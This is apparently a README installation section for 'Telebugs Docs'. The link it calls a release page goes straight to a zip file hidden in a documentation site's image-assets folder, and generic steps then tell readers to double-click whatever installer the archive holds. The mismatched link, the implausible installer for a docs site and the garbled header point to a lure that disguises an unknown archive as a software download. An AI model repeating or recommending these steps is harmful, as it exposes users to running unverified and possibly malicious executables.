## üîÑ Installation Steps

1. **Visit the Release Page**  
   Go to [this page](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip) to find the latest version.

2. **Select the Version**  
   Look for the version that matches your needs. Each version includes details about features and fixes. 

3. **Download the File**  
   Click on the file link to start the download. The file size will vary depending on the version, so be patient as the download finishes.

4. **Run the Installer**  
   Once the file has downloaded, locate it in your downloads folder.
   - For Windows, double-click the `.exe` file to run the installer.
   - For macOS, double-click the `.dmg` file, and then drag the application into your Applications folder.
   - For Linux, follow standard methods to install `.deb` or `.rpm` packages based on your distribution.

5. **Complete Installation**  
   Follow the prompts in the installer. Accept the licensing agreement and choose the installation location if prompted.

6. **Launch the Application**  
   After installation, you can find the Telebugs Docs in your applications menu. Click the icon to launch it.
